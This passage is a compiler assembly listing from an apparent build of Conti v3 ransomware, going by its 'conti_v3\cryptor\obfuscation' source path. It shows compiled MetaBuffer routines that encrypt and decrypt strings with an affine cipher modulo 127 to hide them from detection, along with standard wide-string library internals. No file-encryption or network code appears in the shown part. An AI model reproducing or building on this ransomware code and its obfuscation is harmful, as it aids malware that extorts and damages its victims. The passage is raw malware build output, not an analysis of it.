??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@XZ ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
;	COMDAT ??1?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAA@XZ
_TEXT	SEGMENT
this$ = 8
??1?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAA@XZ PROC ; std::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1>::~_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1>, COMDAT
  00000	c2 00 00	 ret	 0
??1?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAA@XZ ENDP ; std::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1>::~_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1>
_TEXT	ENDS
; Function compile flags: /Ogtpy
;	COMDAT ??1?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ
_TEXT	SEGMENT
this$ = 8
??1?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ PROC ; std::_String_val<std::_Simple_types<wchar_t> >::~_String_val<std::_Simple_types<wchar_t> >, COMDAT
  00000	c2 00 00	 ret	 0
??1?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ ENDP ; std::_String_val<std::_Simple_types<wchar_t> >::~_String_val<std::_Simple_types<wchar_t> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0ED@$0FH@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0ED@$0FH@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z PROC ; MetaBuffer<67,87,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	b9 57 00 00 00	 mov	 ecx, 87			; 00000057H
  00008	2b c8		 sub	 ecx, eax

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0000f	44 8d 04 c9	 lea	 r8d, DWORD PTR [rcx+rcx*8]
  00013	41 c1 e0 02	 shl	 r8d, 2

; 40   :     return (a % n + n) % n;

  00017	41 f7 e8	 imul	 r8d
  0001a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0001f	41 03 d0	 add	 edx, r8d
  00022	c1 fa 06	 sar	 edx, 6
  00025	8b ca		 mov	 ecx, edx
  00027	c1 e9 1f	 shr	 ecx, 31
  0002a	03 d1		 add	 edx, ecx
  0002c	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  0002f	44 2b c1	 sub	 r8d, ecx
  00032	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00036	41 f7 e8	 imul	 r8d
  00039	41 03 d0	 add	 edx, r8d
  0003c	c1 fa 06	 sar	 edx, 6
  0003f	8b ca		 mov	 ecx, edx
  00041	c1 e9 1f	 shr	 ecx, 31
  00044	03 d1		 add	 edx, ecx
  00046	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00049	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0004c	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  00050	c3		 ret	 0
?decrypt@?$MetaBuffer@$0ED@$0FH@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z ENDP ; MetaBuffer<67,87,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0ED@$0FH@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0ED@$0FH@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z PROC ; MetaBuffer<67,87,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 43	 imul	 r8d, eax, 67		; 00000043H
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 57	 add	 r8d, 87			; 00000057H
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0ED@$0FH@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z ENDP ; MetaBuffer<67,87,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0ED@$0FH@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0ED@$0FH@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEBA_NXZ PROC ; MetaBuffer<67,87,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0ED@$0FH@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEBA_NXZ ENDP ; MetaBuffer<67,87,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0EP@$0GK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0EP@$0GK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@@std@@@@AEBAEE@Z PROC ; MetaBuffer<79,106,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	b9 6a 00 00 00	 mov	 ecx, 106		; 0000006aH
  00008	2b c8		 sub	 ecx, eax

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0000f	44 6b c1 2d	 imul	 r8d, ecx, 45		; 0000002dH

; 40   :     return (a % n + n) % n;

  00013	41 f7 e8	 imul	 r8d
  00016	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0001b	41 03 d0	 add	 edx, r8d
  0001e	c1 fa 06	 sar	 edx, 6
  00021	8b ca		 mov	 ecx, edx
  00023	c1 e9 1f	 shr	 ecx, 31
  00026	03 d1		 add	 edx, ecx
  00028	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  0002b	44 2b c1	 sub	 r8d, ecx
  0002e	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00032	41 f7 e8	 imul	 r8d
  00035	41 03 d0	 add	 edx, r8d
  00038	c1 fa 06	 sar	 edx, 6
  0003b	8b ca		 mov	 ecx, edx
  0003d	c1 e9 1f	 shr	 ecx, 31
  00040	03 d1		 add	 edx, ecx
  00042	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00045	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00048	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  0004c	c3		 ret	 0
?decrypt@?$MetaBuffer@$0EP@$0GK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<79,106,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0EP@$0GK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0EP@$0GK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@@std@@@@AEBAEE@Z PROC ; MetaBuffer<79,106,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 4f	 imul	 r8d, eax, 79		; 0000004fH
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 6a	 add	 r8d, 106		; 0000006aH
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0EP@$0GK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<79,106,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0EP@$0GK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0EP@$0GK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@@std@@@@QEBA_NXZ PROC ; MetaBuffer<79,106,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0EP@$0GK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@@std@@@@QEBA_NXZ ENDP ; MetaBuffer<79,106,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?_Getal@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV?$allocator@_W@2@XZ
_TEXT	SEGMENT
this$ = 8
?_Getal@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV?$allocator@_W@2@XZ PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Getal, COMDAT

; 4890 :         return _Mypair._Get_first();

  00000	48 8b c1	 mov	 rax, rcx

; 4891 :     }

  00003	c3		 ret	 0
?_Getal@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV?$allocator@_W@2@XZ ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Getal
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?_Tidy_deallocate@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXXZ
_TEXT	SEGMENT
this$ = 48
?_Tidy_deallocate@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXXZ PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Tidy_deallocate, COMDAT

; 4863 :     _CONSTEXPR20 void _Tidy_deallocate() noexcept { // initialize buffer, deallocating any storage

$LN32:
  00000	40 53		 push	 rbx
  00002	48 83 ec 20	 sub	 rsp, 32			; 00000020H

; 2244 :         return _Myres > _Small_string_capacity;

  00006	48 8b 51 18	 mov	 rdx, QWORD PTR [rcx+24]

; 4863 :     _CONSTEXPR20 void _Tidy_deallocate() noexcept { // initialize buffer, deallocating any storage

  0000a	48 8b d9	 mov	 rbx, rcx

; 2244 :         return _Myres > _Small_string_capacity;

  0000d	48 83 fa 07	 cmp	 rdx, 7

; 4864 :         auto& _My_data = _Mypair._Myval2;
; 4865 :         _My_data._Orphan_all();
; 4866 :         if (_My_data._Large_mode_engaged()) {

  00011	76 31		 jbe	 SHORT $LN23@Tidy_deall
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory

; 977  :         _Deallocate<_New_alignof<_Ty>>(_Ptr, sizeof(_Ty) * _Count);

  00013	48 8b 09	 mov	 rcx, QWORD PTR [rcx]
  00016	48 8d 14 55 02
	00 00 00	 lea	 rdx, QWORD PTR [rdx*2+2]

; 264  :         if (_Bytes >= _Big_allocation_threshold) { // boost the alignment of big allocations to help autovectorization

  0001e	48 81 fa 00 10
	00 00		 cmp	 rdx, 4096		; 00001000H
  00025	72 18		 jb	 SHORT $LN22@Tidy_deall

; 163  :     const uintptr_t _Ptr_container   = _Ptr_user[-1];

  00027	4c 8b 41 f8	 mov	 r8, QWORD PTR [rcx-8]
  0002b	48 83 c2 27	 add	 rdx, 39			; 00000027H

; 164  : 
; 165  :     // If the following asserts, it likely means that we are performing
; 166  :     // an aligned delete on memory coming from an unaligned allocation.
; 167  :     _STL_ASSERT(_Ptr_user[-2] == _Big_allocation_sentinel, "invalid argument");
; 168  : 
; 169  :     // Extra paranoia on aligned allocation/deallocation; ensure _Ptr_container is
; 170  :     // in range [_Min_back_shift, _Non_user_size]
; 171  : #ifdef _DEBUG
; 172  :     constexpr uintptr_t _Min_back_shift = 2 * sizeof(void*);
; 173  : #else // ^^^ defined(_DEBUG) / !defined(_DEBUG) vvv
; 174  :     constexpr uintptr_t _Min_back_shift = sizeof(void*);
; 175  : #endif // ^^^ !defined(_DEBUG) ^^^
; 176  :     const uintptr_t _Back_shift = reinterpret_cast<uintptr_t>(_Ptr) - _Ptr_container;

  0002f	49 2b c8	 sub	 rcx, r8

; 177  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

  00032	48 8d 41 f8	 lea	 rax, QWORD PTR [rcx-8]
  00036	48 83 f8 1f	 cmp	 rax, 31
  0003a	77 1f		 ja	 SHORT $LN19@Tidy_deall

; 178  :     _Ptr = reinterpret_cast<void*>(_Ptr_container);

  0003c	49 8b c8	 mov	 rcx, r8
$LN22@Tidy_deall:

; 268  :         ::operator delete(_Ptr, _Bytes);

  0003f	e8 00 00 00 00	 call	 ??3@YAXPEAX_K@Z		; operator delete
$LN23@Tidy_deall:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring

; 4873 :         _My_data._Mysize = 0;

  00044	33 c0		 xor	 eax, eax

; 4874 :         _My_data._Myres  = _Small_string_capacity;

  00046	48 c7 43 18 07
	00 00 00	 mov	 QWORD PTR [rbx+24], 7
  0004e	48 89 43 10	 mov	 QWORD PTR [rbx+16], rax

; 4875 :         // the _Traits::assign is last so the codegen doesn't think the char write can alias this
; 4876 :         _Traits::assign(_My_data._Bx._Buf[0], _Elem());

  00052	66 89 03	 mov	 WORD PTR [rbx], ax

; 4877 :     }

  00055	48 83 c4 20	 add	 rsp, 32			; 00000020H
  00059	5b		 pop	 rbx
  0005a	c3		 ret	 0
$LN19@Tidy_deall:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory

; 177  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

  0005b	e8 00 00 00 00	 call	 _invalid_parameter_noinfo_noreturn
  00060	cc		 int	 3
$LN30@Tidy_deall:
?_Tidy_deallocate@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXXZ ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Tidy_deallocate
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV12@QEB_W@Z
_TEXT	SEGMENT
this$ = 48
_Ptr$ = 56
?assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV12@QEB_W@Z PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::assign, COMDAT

; 3431 :     _CONSTEXPR20 basic_string& assign(_In_z_ const _Elem* const _Ptr) {

$LN20:
  00000	40 57		 push	 rdi
  00002	48 83 ec 20	 sub	 rsp, 32			; 00000020H
  00006	4c 8b ca	 mov	 r9, rdx
  00009	48 8b f9	 mov	 rdi, rcx

; 264  :         return _CSTD wcslen(reinterpret_cast<const wchar_t*>(_First));

  0000c	48 c7 c2 ff ff
	ff ff		 mov	 rdx, -1
$LL15@assign:
  00013	48 ff c2	 inc	 rdx
  00016	66 41 83 3c 51
	00		 cmp	 WORD PTR [r9+rdx*2], 0
  0001c	75 f5		 jne	 SHORT $LL15@assign

; 3412 :         if (_Count <= _Mypair._Myval2._Myres) {

  0001e	48 8b 41 18	 mov	 rax, QWORD PTR [rcx+24]
  00022	48 3b d0	 cmp	 rdx, rax
  00025	77 45		 ja	 SHORT $LN6@assign
  00027	48 89 5c 24 30	 mov	 QWORD PTR [rsp+48], rbx
  0002c	48 89 74 24 38	 mov	 QWORD PTR [rsp+56], rsi

; 2226 :         value_type* _Result = _Bx._Buf;

  00031	48 8b f7	 mov	 rsi, rdi

; 2244 :         return _Myres > _Small_string_capacity;

  00034	48 83 f8 07	 cmp	 rax, 7

; 2227 :         if (_Large_mode_engaged()) {

  00038	76 03		 jbe	 SHORT $LN9@assign

; 2228 :             _Result = _Unfancy(_Bx._Ptr);

  0003a	48 8b 31	 mov	 rsi, QWORD PTR [rcx]
$LN9@assign:

; 117  :         _CSTD memmove(_First1, _First2, _Count * sizeof(_Elem));

  0003d	48 8d 1c 12	 lea	 rbx, QWORD PTR [rdx+rdx]

; 3415 :             _Mypair._Myval2._Mysize = _Count;

  00041	48 89 51 10	 mov	 QWORD PTR [rcx+16], rdx

; 117  :         _CSTD memmove(_First1, _First2, _Count * sizeof(_Elem));

  00045	4c 8b c3	 mov	 r8, rbx
  00048	49 8b d1	 mov	 rdx, r9
  0004b	48 8b ce	 mov	 rcx, rsi
  0004e	e8 00 00 00 00	 call	 memmove

; 3417 :             _Traits::assign(_Old_ptr[_Count], _Elem());

  00053	33 c0		 xor	 eax, eax
  00055	66 89 04 33	 mov	 WORD PTR [rbx+rsi], ax

; 3432 :         return assign(_Ptr, _Convert_size<size_type>(_Traits::length(_Ptr)));

  00059	48 8b c7	 mov	 rax, rdi
  0005c	48 8b 74 24 38	 mov	 rsi, QWORD PTR [rsp+56]
  00061	48 8b 5c 24 30	 mov	 rbx, QWORD PTR [rsp+48]

; 3433 :     }

  00066	48 83 c4 20	 add	 rsp, 32			; 00000020H
  0006a	5f		 pop	 rdi
  0006b	c3		 ret	 0
$LN6@assign:
  0006c	48 83 c4 20	 add	 rsp, 32			; 00000020H
  00070	5f		 pop	 rdi

; 3422 :         return _Reallocate_for(

  00071	e9 00 00 00 00	 jmp	 ??$_Reallocate_for@V<lambda_1>@?1??assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV34@QEB_W_K@Z@PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV01@_KV<lambda_1>@?1??assign@01@QEAAAEAV01@QEB_W0@Z@PEB_W@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Reallocate_for<`std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::assign'::`2'::<lambda_1>,wchar_t const *>
?assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV12@QEB_W@Z ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::assign
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?_Construct_empty@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXXZ
_TEXT	SEGMENT
this$ = 8
?_Construct_empty@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXXZ PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Construct_empty, COMDAT

; 2644 :         auto& _My_data = _Mypair._Myval2;
; 2645 :         _My_data._Alloc_proxy(_GET_PROXY_ALLOCATOR(_Alty, _Getal()));
; 2646 : 
; 2647 :         // initialize basic_string data members
; 2648 :         _My_data._Mysize = 0;

  00000	33 c0		 xor	 eax, eax

; 2649 :         _My_data._Myres  = _Small_string_capacity;

  00002	48 c7 41 18 07
	00 00 00	 mov	 QWORD PTR [rcx+24], 7
  0000a	48 89 41 10	 mov	 QWORD PTR [rcx+16], rax

; 2650 :         _My_data._Activate_SSO_buffer();
; 2651 : 
; 2652 :         // the _Traits::assign is last so the codegen doesn't think the char write can alias this
; 2653 :         _Traits::assign(_My_data._Bx._Buf[0], _Elem());

  0000e	66 89 01	 mov	 WORD PTR [rcx], ax

; 2654 :     }

  00011	c3		 ret	 0
?_Construct_empty@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXXZ ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Construct_empty
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ??1_Bxty@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ
_TEXT	SEGMENT
this$ = 8
??1_Bxty@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ PROC ; std::_String_val<std::_Simple_types<wchar_t> >::_Bxty::~_Bxty, COMDAT

; 2285 :         _CONSTEXPR20 ~_Bxty() noexcept {} // user-provided, for fancy pointers

  00000	c2 00 00	 ret	 0
??1_Bxty@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ ENDP ; std::_String_val<std::_Simple_types<wchar_t> >::_Bxty::~_Bxty
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?_Myptr@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEBAPEB_WXZ
_TEXT	SEGMENT
this$ = 8
?_Myptr@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEBAPEB_WXZ PROC ; std::_String_val<std::_Simple_types<wchar_t> >::_Myptr, COMDAT

; 2244 :         return _Myres > _Small_string_capacity;

  00000	48 83 79 18 07	 cmp	 QWORD PTR [rcx+24], 7

; 2235 :         const value_type* _Result = _Bx._Buf;
; 2236 :         if (_Large_mode_engaged()) {

  00005	76 04		 jbe	 SHORT $LN6@Myptr

; 2237 :             _Result = _Unfancy(_Bx._Ptr);
; 2238 :         }
; 2239 : 
; 2240 :         return _Result;

  00007	48 8b 01	 mov	 rax, QWORD PTR [rcx]

; 2241 :     }

  0000a	c3		 ret	 0
$LN6@Myptr:

; 2237 :             _Result = _Unfancy(_Bx._Ptr);
; 2238 :         }
; 2239 : 
; 2240 :         return _Result;

  0000b	48 8b c1	 mov	 rax, rcx

; 2241 :     }

  0000e	c3		 ret	 0
?_Myptr@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEBAPEB_WXZ ENDP ; std::_String_val<std::_Simple_types<wchar_t> >::_Myptr
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?_Myptr@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAAPEA_WXZ
_TEXT	SEGMENT
